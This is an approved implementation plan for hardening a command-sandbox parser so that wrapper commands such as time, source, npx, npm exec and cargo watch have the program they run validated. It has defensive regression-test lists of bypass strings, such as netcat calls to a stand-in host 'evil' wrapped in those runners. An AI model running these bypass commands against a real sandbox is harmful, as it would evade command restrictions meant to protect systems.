---
status: approved
issue: 1784
spec: spec/2026-10-15-1784-unwrap-runners.md
---

# Plan: check what `time`, `source`, `npx` and `cargo watch` run

Self-contained. You do not need to open the intent or the spec.

**Problem.** In `apps/backend/security/ast_parser.py`, allowlisted commands
that run another program are checked only by name: `/usr/bin/time nc evil`
→ `['time']`, `source $X` → `['source']`, `npx -c 'nc evil'` and
`npm exec -c …` → the runner only, `cargo watch -s 'nc evil'` → `['cargo']`.

**Approved decisions** (all fail closed: anything outside the allow list
raises `UnparseableCommand`).

1. `time`: add `_skip_time_opts(tokens, j)` next to `_skip_timeout_opts`
   (`:438`) and register `"time": _skip_time_opts` in `_PREFIX_OPT_SKIPPERS`
   (`:446`). Loop while `tokens[j]` starts with `-`: `--` → return `j + 1`;
   in `{"-f", "-o", "--format", "--output"}` → `j += 2`; in
   `{"-p", "-a", "-v", "-q", "--portability", "--append", "--verbose",
   "--quiet"}` or starts with `--format=`/`--output=` → `j += 1`; else raise
   `UnparseableCommand(f"time option {tok} cannot be validated")`. Return `j`.
   `_unwrap_prefix` then checks literals and emits the command.
2. `source`/`.`: new `_unwrap_source(words, idx, depth, acc, *,
   dynamic_args)`; if there is an argument at `idx + 1`: require it literal
   (`_require_literal(words, idx + 1, idx + 2)`), and raise if its text starts
   with `-` or `_STDIN_SCRIPT.fullmatch(...)`. Register for `"source"` and
   `"."`.
3. Package runners: constants `_RUNNER_FLAGS = frozenset({"-y", "--yes",
   "--no", "-q", "--quiet", "--ignore-existing", "--no-install",
   "--include-workspace-root", "--workspaces", "-ws"})`,
   `_RUNNER_VALUE_OPTS = frozenset({"-p", "--package", "-w", "--workspace"})`.
   `_check_package_runner(words, start)`: `j = start`; loop while
   `j < len(words)`: `tok = words[j].word`; `--` → `j += 1`, stop; not
   starting with `-` → stop; `name = tok.split("=", 1)[0]`; if
   `name in _RUNNER_VALUE_OPTS`: `nxt = j + 1 if "=" in tok else j + 2`;
   elif `tok in _RUNNER_FLAGS`: `nxt = j + 1`; else raise (this covers `-c`,
   `--call`, `--shell-mode` and any unknown option; give `-c`/`--call`/
   `--shell-mode` the reason "runs a shell command string"); require
   `words[j:nxt]` literal; `j = nxt`. After the loop, if `j < len(words)`
   require `words[j]` literal (the package). Unwrappers: `"npx"`/`"pnpx"` →
   check from `idx + 1`; `"npm"` → if a word after `idx` equals `exec` or
   `x`, check from the word after the first such one.
4. `cargo`: new unwrapper; raise `UnparseableCommand("cargo watch runs shell
   commands from a long-running watcher; not permitted")` if any word after
   `idx` equals `watch`. `cargo-watch`: remove it from
   `apps/backend/project/command_registry/languages.py:70`.
5. Use a fresh variable instead of reassigning a loop variable; no magic
   numbers (the strict ruff ratchet).

## Steps

### Step 1 — regression tests

File: `tests/test_command_sandbox.py`.

- Append to `DYNAMIC_COMMAND_WORD` (parser raises), comment
  `# Runners that run another program (#1784).`:
  `"/usr/bin/time --bogus ls"`, `"source $X"`, `'. "$X"'`,
  `"source /dev/stdin"`, `"source -p x f"`, `"npx $X"`,
  `"npx -c 'nc evil 80'"`, `"npx --call 'nc evil 80'"`,
  `"npm exec -c 'nc evil 80'"`, `"npm x --call=nc"`, `"pnpx -c 'nc'"`,
  `"pnpx --shell-mode nc"`, `"npx --bogus x"`, `'npx -p "$P" x'`,
  `"cargo watch -s 'nc evil 80'"`, `"cargo watch -x test"`.
- Append to `BYPASS_PAYLOADS` (allowlist refuses):
  `"/usr/bin/time nc evil 80"`, `"/usr/bin/time -f %e nc evil 80"`,
  `"cargo-watch -s 'nc evil 80'"`.
- Add to `MUST_PARSE` (exact names):
  `"/usr/bin/time -f %e git status": ["time", "git"]`,
  `"source ./env.sh": ["source"]`, `'npx eslint -c cfg.json "$F"': ["npx"]`,
  `"npm exec --yes -- tsc": ["npm"]`, `"cargo test": ["cargo"]`
  (`npx --yes prettier --check .` is already there).

Check: `pytest tests/test_command_sandbox.py -q` — the new
`DYNAMIC_COMMAND_WORD` rows, the time `BYPASS_PAYLOADS` rows,
`cargo-watch -s`, and `/usr/bin/time -f %e git status` FAIL on unfixed code.

### Step 2 — the fix

Files: `apps/backend/security/ast_parser.py` (decisions 1-5) and
`apps/backend/project/command_registry/languages.py:70` (remove
`"cargo-watch",` and its line only; keep the comment above for the other
tools).

Check: `pytest tests/test_command_sandbox.py tests/test_plan_commands.py -q`
pass; `ruff check` and `ruff format --check` on both files.

### Step 3 — CHANGELOG

`### Security` bullet under `## [Unreleased]` in `CHANGELOG.md`.

## Rollback

Revert the fix commit; the tests commit goes with it.
